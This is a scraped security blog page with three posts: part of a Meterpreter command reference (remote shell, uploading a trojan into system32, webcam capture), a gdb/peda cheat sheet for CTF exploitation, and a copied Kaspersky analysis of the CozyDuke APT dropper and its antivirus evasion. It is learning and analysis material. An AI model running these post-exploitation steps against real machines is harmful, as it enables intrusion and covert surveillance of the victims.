<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; resource </span><br><span class="line">Usage: resource path1 path2Run the commands stored <span class="keyword">in</span> the supplied files.</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>

<p>参数:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">path1:		包含要执行的命令的文件的位置</span><br><span class="line">Path2Run:	在文件中找到的执行命令的位置</span><br></pre></td></tr></table></figure>

<p><strong>示例</strong><br>使用的resource文件如下:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cat resource.txt</span></span><br><span class="line">ls</span><br><span class="line">background</span><br><span class="line">root@kali:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>执行resource命令:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; &gt; resource resource.txt</span><br><span class="line">[*] Reading /root/resource.txt</span><br><span class="line">[*] Running ls</span><br><span class="line"></span><br><span class="line">Listing: C:\Documents and Settings\Administrator\Desktop</span><br><span class="line">========================================================</span><br><span class="line"></span><br><span class="line">Mode              Size    Type  Last modified              Name</span><br><span class="line">----              ----    ----  -------------              ----</span><br><span class="line">40777/rwxrwxrwx   0       dir   2012-02-29 16:41:29 -0500  .</span><br><span class="line">40777/rwxrwxrwx   0       dir   2012-02-02 12:24:40 -0500  ..</span><br><span class="line">100666/rw-rw-rw-  606     fil   2012-02-15 17:37:48 -0500  IDA Pro Free.lnk</span><br><span class="line">100777/rwxrwxrwx  681984  fil   2012-02-02 15:09:18 -0500  Sc303.exe</span><br><span class="line">100666/rw-rw-rw-  608     fil   2012-02-28 19:18:34 -0500  Shortcut to Ability Server.lnk</span><br><span class="line">100666/rw-rw-rw-  522     fil   2012-02-02 12:33:38 -0500  XAMPP Control Panel.lnk</span><br><span class="line"></span><br><span class="line">[*] Running background</span><br><span class="line"></span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line">msf  exploit(handler) &gt;</span><br></pre></td></tr></table></figure>

<h2 id="SEARCH"><a href="#SEARCH" class="headerlink" title="SEARCH"></a>SEARCH</h2><p>在目标机上搜索具体的文件，可以在整个系统中搜索，也可以在指定的目录下搜索，在创建文件模式时可以使用通配符。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; search</span><br><span class="line">[-] You must specify a valid file glob to search <span class="keyword">for</span>, e.g. &gt;search -f *.doc</span><br></pre></td></tr></table></figure>

<p>参数:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">File pattern:	 	May contain wildcards</span><br><span class="line">Search location:	Optional, <span class="keyword">if</span> none is given the whole system will be searched.</span><br></pre></td></tr></table></figure>

<p>示例:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; search -f autoexec.bat</span><br><span class="line">Found 1 result...</span><br><span class="line">    c:\AUTOEXEC.BAT</span><br><span class="line">meterpreter &gt; search -f sea*.bat c:\\xamp\\</span><br><span class="line">Found 1 result...</span><br><span class="line">    c:\\xampp\perl\bin\search.bat (57035 bytes)</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>

<h2 id="SHELL"><a href="#SHELL" class="headerlink" title="SHELL"></a>SHELL</h2><p>返回目标机上的一个标准的shell：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 39640 created.</span><br><span class="line">Channel 2 created.</span><br><span class="line">Microsoft Windows XP [Version 5.1.2600]</span><br><span class="line">(C) Copyright 1985-2001 Microsoft Corp.</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt;</span><br></pre></td></tr></table></figure>

<h2 id="UPLOAD"><a href="#UPLOAD" class="headerlink" title="UPLOAD"></a>UPLOAD</h2><p>上传文件到目标机上，同<strong>download</strong> 命令一样在路径中需要使用两个反斜杠：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload evil_trojan.exe c:\\windows\\system32</span><br><span class="line">[*] uploading  : evil_trojan.exe -&gt; c:\windows\system32</span><br><span class="line">[*] uploaded   : evil_trojan.exe -&gt; c:\windows\system32\evil_trojan.exe</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>

<h2 id="WEBCAM-LIST"><a href="#WEBCAM-LIST" class="headerlink" title="WEBCAM_LIST"></a>WEBCAM_LIST</h2><p>列出当前目标机器上可用的Webcam设备。</p>
<p>示例:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; webcam_list</span><br><span class="line">1: Creative WebCam NX Pro</span><br><span class="line">2: Creative WebCam NX Pro (VFW)</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>

<h2 id="WEBCAM-SNAP"><a href="#WEBCAM-SNAP" class="headerlink" title="WEBCAM_SNAP"></a>WEBCAM_SNAP</h2><p>利用已连接的webcam设备在目标机上截屏并以随机文件名的jpg格式保存在本地当前工作目录。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; webcam_snap -h</span><br><span class="line">Usage: webcam_snap [options]</span><br><span class="line">Grab a frame from the specified webcam.</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -h      Help Banner</span><br><span class="line">    -i   要使用的webcam设备的编号(Default: 1)</span><br><span class="line">    -p   jpg图片的路径 (Default: <span class="string">&#x27;gnFjTnzi.jpeg&#x27;</span>)</span><br><span class="line">    -q   jpg图片的质量 (Default: <span class="string">&#x27;50&#x27;</span>)</span><br><span class="line">    -v   是否自动查看图片 (Default: <span class="string">&#x27;true&#x27;</span>)</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>

<p>选项:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-h:	Displays the help information for the command</span><br><span class="line">-i opt:	If more then 1 web cam is connected, use this option to select the device to capture the</span><br><span class="line">        image from</span><br><span class="line">-p opt:	Change path and filename of the image to be saved</span><br><span class="line">-q opt:	The imagine quality, 50 being the default&#x2F;medium setting, 100 being best quality</span><br><span class="line">-v opt:	By default the value is true, which opens the image after capture.</span><br></pre></td></tr></table></figure>

<p>示例:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; webcam_snap -i 1 -v false</span><br><span class="line">[*] Starting...</span><br><span class="line">[+] Got frame</span><br><span class="line">[*] Stopped</span><br><span class="line">Webcam shot saved to: &#x2F;root&#x2F;Offsec&#x2F;YxdhwpeQ.jpeg</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://spwpun.github.io/2019/12/28/pwn_tips/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Demen Lee">
      <meta itemprop="description" content="Sharing, Communicating more, then moving on......">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Spwpun's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/12/28/pwn_tips/" class="post-title-link" itemprop="url">pwn tips in gdb</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2019-12-28 21:34:54" itemprop="dateCreated datePublished" datetime="2019-12-28T21:34:54+08:00">2019-12-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-12-29 18:25:46" itemprop="dateModified" datetime="2019-12-29T18:25:46+08:00">2019-12-29</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" itemprop="url" rel="index"><span itemprop="name">工具使用</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2019/12/28/pwn_tips/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2019/12/28/pwn_tips/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>不是原创，借鉴别人整理的。</p>
<h3 id="1-调试的快捷键"><a href="#1-调试的快捷键" class="headerlink" title="1. 调试的快捷键"></a>1. 调试的快捷键</h3><p>peda带有的功能，直接输入命令，其就会给予提示（如果不是这样，基本上也是该命令就可以不带参数）。这儿就不多做介绍</p>
<h4 id="1-1-基础的调试快捷键"><a href="#1-1-基础的调试快捷键" class="headerlink" title="1.1 基础的调试快捷键"></a>1.1 基础的调试快捷键</h4><ul>
<li>s step，si步入</li>
<li>n 执行下一条指令 ni步入</li>
<li>b 在某处下断点，可以用<ul>
<li>b * adrress</li>
<li>b function_name</li>
<li>info b 查看断点信息</li>
<li>delete 1删除第一个断点</li>
</ul>
</li>
<li>c 继续</li>
<li>r 执行</li>
<li>disas addr 查看addr处前后的反汇编代码，也可以是函数名字</li>
</ul>
<h4 id="1-2-显示数据"><a href="#1-2-显示数据" class="headerlink" title="1.2 显示数据"></a>1.2 显示数据</h4><h5 id="p-系列"><a href="#p-系列" class="headerlink" title="p 系列"></a>p 系列</h5><ul>
<li>p system/main 显示某个函数地址<pre><code>- p $esp 显示寄存器</code></pre>
</li>
<li>p/x p/a p/b p/s。。。</li>
<li>p 0xff - 0xea 计算器</li>
<li>print &amp;VarName 查看变量地址</li>
<li>p * 0xffffebac 查看某个地址处的值</li>
</ul>
<h5 id="x系列"><a href="#x系列" class="headerlink" title="x系列"></a>x系列</h5><ul>
<li>x/xw addr 显示某个地址处开始的16进制内容，如果有符号表会加载符号表</li>
<li>x/x $esp 查看esp寄存器中的值</li>
<li>x/s addr 查看addr处的字符串</li>
<li>x/b addr 查看addr处的字符</li>
<li>x/i addr 查看addr处的反汇编结果</li>
</ul>
<h5 id="info系列"><a href="#info系列" class="headerlink" title="info系列"></a>info系列</h5><ul>
<li>info register $ebp 查看寄存器ebp中的内容 (简写为 i r ebp)</li>
<li>i r eflags 查看状态寄存器</li>
<li>i r ss 查看段寄存器</li>
<li>i b 查看断点信息</li>
<li>i functions 查看所有的函数</li>
</ul>
<p>disas addr 查看addr处前后的反汇编代码</p>
<p>stack 20 查看栈内20个值</p>
<p>show args 查看参数</p>
<p>vmmap 查看映射状况 peda带有</p>
<p>readelf 查看elf文件中各个段的起始地址 peda带有</p>
<p>parseheap 显示堆状况 peda带有</p>
<h4 id="1-3-查找数据"><a href="#1-3-查找数据" class="headerlink" title="1.3 查找数据"></a>1.3 查找数据</h4><ul>
<li>find 查找字符串 peda带有</li>
<li>searchmem 查找字符串 peda带有</li>
<li>ropsearch “xor eax,eax;ret” 0x08048080 0x08050000 查找某段的rop peda带有</li>
<li>ropgadget 提供多个pop|ret可行结果 peda带有</li>
</ul>
<h4 id="1-4-修改数据"><a href="#1-4-修改数据" class="headerlink" title="1.4 修改数据"></a>1.4 修改数据</h4><ul>
<li>set $esp=0x110 修改寄存器的值</li>
<li>set *0xf7ff3234=0x08042334 修改内存的值</li>
<li>set args “asdasg” “afdasgasg” “agasdsa” 分别给参数1,2,3赋值</li>
<li>set args “<code>python -c &#39;print &quot;1234\x7f\xde&quot;&#39;</code>“ 这个参数中用python脚本重写了一下，避免有些字符无法正确设置</li>
<li>r “arg1” “arg2” “arg3” 设置参数</li>
<li>run <code>$(perl -e &#39;print &quot;A&quot;x20&#39;)</code></li>
</ul>
<h4 id="1-5-peda插件"><a href="#1-5-peda插件" class="headerlink" title="1.5 peda插件"></a>1.5 peda插件</h4><p>Enhance the display of gdb: colorize and display disassembly codes, registers, memory information during debugging.<br>Add commands to support debugging and exploit development (for a full list of commands use peda help):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">aslr -- Show/<span class="built_in">set</span> ASLR setting of GDB</span><br><span class="line">checksec -- Check <span class="keyword">for</span> various security options of binary</span><br><span class="line">dumpargs -- Display arguments passed to a <span class="keyword">function</span> when stopped at a call instruction</span><br><span class="line">dumprop -- Dump all ROP gadgets <span class="keyword">in</span> specific memory range</span><br><span class="line">elfheader -- Get headers information from debugged ELF file</span><br><span class="line">elfsymbol -- Get non-debugging symbol information from an ELF file</span><br><span class="line">lookup -- Search <span class="keyword">for</span> all addresses/references to addresses <span class="built_in">which</span> belong to a memory range</span><br><span class="line">patch -- Patch memory start at an address with string/hexstring/int</span><br><span class="line">pattern -- Generate, search, or write a cyclic pattern to memory</span><br><span class="line">procinfo -- Display various info from /proc/pid/</span><br><span class="line">pshow -- Show various PEDA options and other settings</span><br><span class="line">pset -- Set various PEDA options and other settings</span><br><span class="line">readelf -- Get headers information from an ELF file</span><br><span class="line">ropgadget -- Get common ROP gadgets of binary or library</span><br><span class="line">ropsearch -- Search <span class="keyword">for</span> ROP gadgets <span class="keyword">in</span> memory</span><br><span class="line">searchmem|find -- Search <span class="keyword">for</span> a pattern <span class="keyword">in</span> memory; support regex search</span><br><span class="line">shellcode -- Generate or download common shellcodes.</span><br><span class="line">skeleton -- Generate python exploit code template</span><br><span class="line">vmmap -- Get virtual mapping address ranges of section(s) <span class="keyword">in</span> debugged process</span><br><span class="line">xormem -- XOR a memory region with a key</span><br><span class="line">Installation</span><br></pre></td></tr></table></figure>
<p>vmmap：查看当前程序映射的内存块<br>dumprop：</p>
<h3 id="2-查找某个plt、got、plt-2"><a href="#2-查找某个plt、got、plt-2" class="headerlink" title="2.查找某个plt、got、plt_2"></a>2.查找某个plt、got、plt_2</h3><ul>
<li><p>plt 可以直接使用pwntools中的ELF(elf).symbols(function_name)</p>
</li>
<li><p>got 可以直接使用pwntools中的ELF(elf).got(function_name)</p>
</li>
<li><p>plt_2 可以直接使用pwntools中的ELF(lib).symbols(function_name)</p>
</li>
</ul>
<h3 id="3-查找程序所动态链接的库"><a href="#3-查找程序所动态链接的库" class="headerlink" title="3.查找程序所动态链接的库"></a>3.查找程序所动态链接的库</h3><ul>
<li>file pwn3<ul>
<li>pwn3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=916959406d0c545f6971223c8e06bff1ed9ae74d, not stripped</li>
</ul>
</li>
<li>checksec pwn3<ul>
<li>[*] ‘/root/Desktop/Pwnable/fmt/normal/fmt_string_write_got/pwn3’<br>Arch: i386-32-little<br>RELRO: Partial RELRO<br>Stack: No canary found<br>NX: NX enabled<br>PIE: No PIE (0x8048000)</li>
</ul>
</li>
<li>ldd pwn3<ul>
<li>linux-gate.so.1 (0xf77ad000)<br>libc.so.6 =&gt; /lib32/libc.so.6 (0xf75d2000)<br>/lib/ld-linux.so.2 (0x56601000)</li>
</ul>
</li>
</ul>
<h3 id="4-编译32位可执行文件"><a href="#4-编译32位可执行文件" class="headerlink" title="4.编译32位可执行文件"></a>4.编译32位可执行文件</h3><ul>
<li><p>gcc -m32 test.c -o test</p>
<ul>
<li>一般而言此时的目标文件为32位，且不能生成调试信息</li>
</ul>
</li>
<li><p>gcc -m32 -g test.c -o test</p>
<ul>
<li>生成的目标文件是32位，且可以利用操作系统的“原生格式（native format）”生成调试信息。GDB 可以直接利用这个信息，其它调试器也可以使用这个调试信息</li>
</ul>
</li>
<li><p>其它保护状态的开启，请参考linux程序的常用保护机制</p>
</li>
</ul>
<h3 id="5-开启PIE之后的调试"><a href="#5-开启PIE之后的调试" class="headerlink" title="5.开启PIE之后的调试"></a>5.开启PIE之后的调试</h3><p>开启PIE之后，地址会一直在变，这十分不利于gdb的调试，所以这时候应该在本地关闭ASLR</p>
<ul>
<li>常用的方法是：echo 0 &gt; /proc/sys/kernel/randomize_va_space</li>
</ul>
<ul>
<li>开启的方式是：echo 2 &gt; /proc/sys/kernel/randomize_va_space</li>
</ul>
<h3 id="6-运行时查看文件执行"><a href="#6-运行时查看文件执行" class="headerlink" title="6.运行时查看文件执行"></a>6.运行时查看文件执行</h3><p>做了一道题，在你不执行的时候，只能找到相对地址，但是下断点需要实际的执行地址。若关闭PIE，那么每次的执行地址将会一致，这个时候就需要找到执行的开始地址。peda的常用指令中有vmmap，可以找到实际地址。</p>
<p>这道题很让人苦恼的是，如果gdb中执行run，那么将陷入循环而不能使用vmmap，若强制结束，最后vmmap会报错。这个时候，就有另外的一些办法：</p>
<ul>
<li>执行./pwn &amp;，这个时候会将pwn程序放入后台，而且你能快速知道这个程序的PID，这个时候cat /proc/pwn的PID/maps，就能找到对应的执行时地址。之后kill -9 pwn的PID</li>
<li>编写一个小脚本，任意放置一个断点，并开启gdb调试，这个时候断点会崩溃，但是gdb-peda中使用vmmap仍能找到对应地址</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://spwpun.github.io/2019/12/20/The-CozyDuke-APT-s-analysis/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Demen Lee">
      <meta itemprop="description" content="Sharing, Communicating more, then moving on......">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Spwpun's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/12/20/The-CozyDuke-APT-s-analysis/" class="post-title-link" itemprop="url">The CozyDuke APT's analysis</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2019-12-20 01:07:21" itemprop="dateCreated datePublished" datetime="2019-12-20T01:07:21+08:00">2019-12-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-03-30 09:40:12" itemprop="dateModified" datetime="2020-03-30T09:40:12+08:00">2020-03-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">样本分析</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2019/12/20/The-CozyDuke-APT-s-analysis/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2019/12/20/The-CozyDuke-APT-s-analysis/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="Prefix"><a href="#Prefix" class="headerlink" title="Prefix"></a>Prefix</h3><p>This article is copied from Kaspersky‘s <a target="_blank" rel="noopener" href="https://securelist.com/the-cozyduke-apt/69731/">site</a>, which just for learning. It’s an analysis of the <code>HEUR:Trojan.Win32.CozyDuke.gen</code> and <code>Trojan.Win32.CozyBear.*</code>.</p>
<h1 id="The-CozyDuke-APT"><a href="#The-CozyDuke-APT" class="headerlink" title="The CozyDuke APT"></a>The CozyDuke APT</h1><p>By <a target="_blank" rel="noopener" href="https://securelist.com/author/kurtb/">Kurt Baumgartner</a>, <a target="_blank" rel="noopener" href="https://securelist.com/author/costin/">Costin Raiu</a> on April 21, 2015. 8:50 pm</p>
<p>CozyDuke (aka CozyBear, CozyCar or “Office Monkeys”) is a precise attacker. Kaspersky Lab has observed signs of attacks against government organizations and commercial entities in the US, Germany, South Korea and Uzbekistan. In 2014, targets included the White House and the US Department of State, as believed.</p>
<p>The operation presents several interesting aspects</p>
<ul>
<li>extremely sensitive high profile victims and targets</li>
<li>evolving crypto and anti-detection capabilities</li>
<li>strong malware functional and structural similarities mating this toolset to early MiniDuke second stage components, along with more recent CosmicDuke and OnionDuke components</li>
</ul>
<p>The actor often spearphishes targets with e-mails containing a link to a hacked website. Sometimes it is a high profile, legitimate site such as “diplomacy.pl”, hosting a ZIP archive. The ZIP archive contains a RAR SFX which installs the malware and shows an empty PDF decoy.</p>
<p><a target="_blank" rel="noopener" href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061845/monkeys.png"><img src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061845/monkeys.png" alt="monkeys"></a></p>
<p>In other highly successful runs, this actor sends out phony flash videos directly as email attachments. A clever example is “Office Monkeys LOL Video.zip”. The executable within not only plays a flash video, but drops and runs another CozyDuke executable. These videos are quickly passed around offices with delight while systems are infected in the background silently. Many of this APT’s components are signed with phony Intel and AMD digital certificates.</p>
<p>Recent CozyDuke APT activity attracted significant attention in the news:</p>
<p><a target="_blank" rel="noopener" href="http://www.cnn.com/2015/03/10/politics/state-department-hack-worst-ever/">Sources: State Dept. hack the ‘worst ever’</a>, CNN News, March 2015<br><a target="_blank" rel="noopener" href="http://www.bbc.com/news/technology-29817644">White House computer network ‘hacked’</a>, BBC News, October 2014<br><a target="_blank" rel="noopener" href="http://www.wsj.com/articles/three-months-later-state-department-hasnt-rooted-out-hackers-1424391453">Three Months Later, State Department Hasn’t Rooted Out Hackers</a>, Wall Street Journal, February 2015<br><a target="_blank" rel="noopener" href="http://www.washingtonpost.com/world/national-security/state-department-shuts-down-its-e-mail-system-amid-concerns-about-hacking/2014/11/16/92cf0722-4815-41ca-b602-9bfe8ecdb256_story.html">State Department shuts down its e-mail system amid concerns about hacking</a>, Washington Post, November 2014</p>
<p><a target="_blank" rel="noopener" href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061725/CozyDuke_map.png"><img src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061725/CozyDuke_map.png" alt="CozyDuke_map"></a></p>
<p>Let’s examine a smattering of representative CozyDuke files and data. There is much to their toolset.</p>
<h3 id="Office-Monkeys-dropper-analysis"><a href="#Office-Monkeys-dropper-analysis" class="headerlink" title="Office Monkeys dropper analysis"></a>Office Monkeys dropper analysis</h3><p>CozyDuke droppers and spyware components often maintain fairly common characteristics, but these files’ functionality are modified in slight ways depending on the team’s needs. This rapid development and deployment is interesting.</p>
<p>68271df868f462c06e24a896a9494225,<strong>Office Monkeys LOL Video.zip</strong></p>
<p>Believe it or not, recipients in bulk run the file within:</p>
<p>95b3ec0a4e539efaa1faa3d4e25d51de,<strong>Office Monkeys (Short Flash Movie).exe</strong></p>
<p>This file in turn drops two executables to %temp%:</p>
<ul>
<li>2aabd78ef11926d7b562fd0d91e68ad3, Monkeys.exe</li>
<li>3d3363598f87c78826c859077606e514, player.exe</li>
</ul>
<p>It first launches Monkeys.exe, playing a self-contained, very funny video of white-collar tie wearing chimpanzees working in a high rise office with a human colleague. It then launches player.exe, a CozyDuke dropper maintaining anti-detection techniques:</p>
<p>3d3363598f87c78826c859077606e514,player.exe,338kb,Trojan.Win32.CozyBear.v,CompiledOn:2014.07.02 21:13:33</p>
<h3 id="Anti-detection-and-trojan-functionality"><a href="#Anti-detection-and-trojan-functionality" class="headerlink" title="Anti-detection and trojan functionality"></a>Anti-detection and trojan functionality</h3><p>The file collects system information, and then invokes a WMI instance in the rootsecuritycenter namespace to identify security products installed on the system, meaning that this code was built for x86 systems, wql here:</p>
<p>SELECT * FROM AntiVirusProduct<br>SELECT * FROM FireWallProduct</p>
<p>The code hunts for several security products to evade:</p>
<ul>
<li>CRYSTAL</li>
<li>KASPERSKY</li>
<li>SOPHOS</li>
<li>DrWeb</li>
<li>AVIRA</li>
<li>COMODO Dragon</li>
</ul>
<p>In addition to the WMI/wql use, it also hunts through the “SOFTWAREMicrosoftWindowsCurrentVersionUninstall” registry key looking for security products to avoid. Following these checks, it drops several more malware files signed with the pasted AMD digital signature to a directory it creates. These files are stored within an 217kb encrypted cab file in the dropper’s resources under the name “A”. The cab file was encrypted and decrypted using a simple xor cipher with a rotating 16 byte key: x36x11xddx08xacx4bx72xf8x51x04x68x2ex3ex38x64x32.</p>
<p>The cab file is decompressed and its contents are created on disk. These dropped files bundle functionality for both 64bit and 32bit Windows systems and are all located within one directory:<br>C:\Documents and Settings\userApplication Data\ATI_Subsystem</p>
<p>6761106f816313394a653db5172dc487,amdhcp32.dll,54kb  ← 32bit dll,CompiledOn:2014.07.02 21:13:24<br>d596827d48a3ff836545b3a999f2c3e3,aticaldd.dll,60kb  ← 64bit dll,CompiledOn:2014.07.02 21:13:26<br>bc626c8f11ed753f33ad1c0fe848d898,atiumdag.dll,285kb ← 32bit dll, Trojan.Win32.CozyDuke.a, CompiledOn:2014.07.02 21:13:26<br>4152e79e3dbde55dcf3fc2014700a022,6kb,racss.dat</p>
<p>The code copies rundll32.exe from windows\system32 to its newly created %appdata%ATI_Subsystem subdirectory as “amdocl_as32.exe” alongside the three dll’s listed above. It runs atiumdag.dll with two parameter values, it’s only export and an arbitrary pid,  i.e.:<br>“C:\Documents and Settings\userApplication Data\ATI_Subsystem\amdocl_as32.exe” “C:Documents and SettingsuserApplication DataATI_Subsystematiumdag.dll””, ADL2_ApplicationProfiles_System_Reload 1684″</p>
<p>This dll is built with anti-AV protections as well. However, it looks for a different but overlapping set, and the random duplication suggests that this component was cobbled together with its dropper, partly regionally based on target selection.</p>
<ul>
<li>K7</li>
<li>KASPERSKY</li>
<li>AVG</li>
</ul>
<p>The code collects information about the system and xml formats this data prior to encryption for proper parsing:</p>
<p><a target="_blank" rel="noopener" href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061738/collectedSystemInfo.png"><img src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061738/collectedSystemInfo.png" alt="collectedSystemInfo"></a></p>
